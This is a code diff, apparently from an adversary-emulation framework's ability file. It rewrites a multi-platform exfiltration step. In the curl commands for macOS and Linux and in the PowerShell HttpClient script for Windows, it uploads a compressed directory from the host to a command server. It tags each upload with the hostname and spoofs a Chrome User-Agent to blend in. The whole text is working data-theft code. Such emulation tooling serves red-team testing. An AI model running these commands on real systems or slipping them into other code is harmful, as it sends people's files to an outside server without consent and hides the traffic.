@@ -11,25 +11,31 @@
     darwin:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: #{paw}" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
     linux:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: {paw}" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
     windows:
       psh,pwsh:
+        # REF: https://stackoverflow.com/a/45409728
         command: |
-          $fileBin = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");
-          $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
-          $fileEnc = $enc.GetString($fileBin);
-          $boundary = [System.Guid]::NewGuid().ToString();
-          $LF = "`r`n";
-          $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="#{host.dir.compress}"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
-          $url="#{server}/file/upload";
-          $web=New-Object -ComObject MSXML2.ServerXMLHTTP;
-          $web.setOption(2,13056);
-          $web.open("POST", $url, $false);
-          $web.setRequestHeader("Content-Type","multipart/form-data; boundary=$boundary");
-          $web.setRequestHeader("X-Request-ID","#{paw}");
-          $web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
-          $web.Send($bodyLines);
+          $ErrorActionPreference = 'Stop';
+          $fieldName = '#{host.dir.compress}';
+          $filePath = '#{host.dir.compress}';
+          $url = "#{server}/file/upload";
+
+          Add-Type -AssemblyName 'System.Net.Http';
+
+          $client = New-Object System.Net.Http.HttpClient;
+          $content = New-Object System.Net.Http.MultipartFormDataContent;
+          $fileStream = [System.IO.File]::OpenRead($filePath);
+          $fileName = [System.IO.Path]::GetFileName($filePath);
+          $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+          $content.Add($fileContent, $fieldName, $fileName);
+          $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+          $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+
+          $result = $client.PostAsync($url, $content).Result;
+          $result.EnsureSuccessStatusCode();
+
